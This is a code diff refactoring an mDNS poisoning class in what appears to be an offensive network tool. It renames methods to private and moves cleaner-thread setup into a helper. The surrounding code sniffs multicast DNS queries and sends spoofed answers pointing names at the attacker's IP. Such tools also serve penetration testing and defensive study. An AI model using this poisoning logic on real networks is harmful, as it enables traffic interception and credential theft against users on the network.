@@ -48,6 +48,7 @@ class MDNS(PoisonNetwork):
         Returns:
             DNSRR: [ DNS record ]
         """
+
         return DNSRR(
             rrname=pkt[DNS].qd.qname,
             type="A",
@@ -57,11 +58,11 @@ class MDNS(PoisonNetwork):
             rdata=self.ip,
         )
 
-    def _transport_layer(self, response: packet) -> packet:
+    def __transport_layer(self, response: packet) -> packet:
         response /= UDP(sport="mdns", dport="mdns")
         return response
 
-    def _application_layer(self, pkt: packet, response: packet) -> packet:
+    def __application_layer(self, pkt: packet, response: packet) -> packet:
         response /= DNS(
             id=pkt[DNS].id,
             qr=1,
@@ -124,20 +125,17 @@ class MDNS(PoisonNetwork):
         if self.__filter_for_mdns(pkt):
             response = self._data_link_layer(pkt)
             response, ip_of_the_packet = self._network_layer(pkt, response)
-            response = self._transport_layer(response)
-            response = self._application_layer(pkt, response)
+            response = self.__transport_layer(response)
+            response = self.__application_layer(pkt, response)
             self.__send_packet(response, ip_of_the_packet)
 
     def start_mdns_poisoning(self) -> None:
         """[ Function to start the poisoner ]"""
         self.info_logger.log(self.logger_level, "Starting mdns poisoning...")
-        cleaner_thread = Thread(target=self._cleaner)
-        cleaner_thread.daemon = True
-        cleaner_thread.start()
+        self._start_cleaner()
         sniff(
             filter="udp and port mdns",
             iface=self.iface,
             prn=self.__craft_malicious_packets,
             store=0,
         )
-
